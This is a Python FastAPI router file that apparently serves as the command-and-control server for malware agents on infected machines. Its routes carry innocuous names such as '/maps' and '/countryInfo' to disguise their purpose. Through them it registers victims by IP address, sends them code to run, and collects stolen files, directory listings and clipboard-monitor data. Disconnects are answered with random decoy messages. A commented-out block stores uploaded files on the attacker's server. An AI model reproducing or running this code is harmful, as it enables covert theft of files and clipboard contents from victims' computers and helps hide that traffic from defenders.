from fastapi import Request, Response
from fastapi import APIRouter
import Logic.Agents.AgentsLogic as agentLogic
import Logic.Request.RequestLogic as requestLogic
import Logic.Request.RequestHandler as requestHandler

AgentCodesPath = 'AgentCodes'

router = APIRouter()


@router.get("/login")
async def login(request: Request):
    host = request.client.host
    agentLogic.connect_agent(agentLogic.ConnectAgentInputType(ip_address=host))
    return await requestLogic.prepare_code_for_agent(host)


@router.get("/maps")
async def default(request: Request):
    host = request.client.host
    return await requestLogic.prepare_code_for_agent(host)


@router.post("/personalRecommendations")
async def disconnect(request: Request):
    host = request.client.host

    data = await request.body()

    await requestHandler.handle_disconnect_agent(data, host)

    return requestLogic.generate_random_message()


@router.post("/map")
async def upload_file(request: Request):
    host = request.client.host

    data = await request.body()

    await requestHandler.handle_file_upload(data, host)

    return await requestLogic.prepare_code_for_agent(host)


@router.post("/recommendations")
async def upload_file_list(request: Request):
    host = request.client.host

    data = await request.body()

    await requestHandler.handle_file_list(data, host)

    return await requestLogic.prepare_code_for_agent(host)


@router.post("/countryInfo")
async def upload_file_list(request: Request):
    host = request.client.host

    data = await request.body()

    await requestHandler.handle_clipboard_monitor(data, host)

    # todo add html
    return "success"


"""
@app.post("/uploadFile")
async def upload_file(file: UploadFile = File(...)):
    name = file.filename

    path = os.path.join("/home/kali/INZ/CybServer/downloads", name)
    file_to_save = open(path, "wb")
    content = await file.read()
    file_to_save.write(content)
    file_to_save.close()
"""
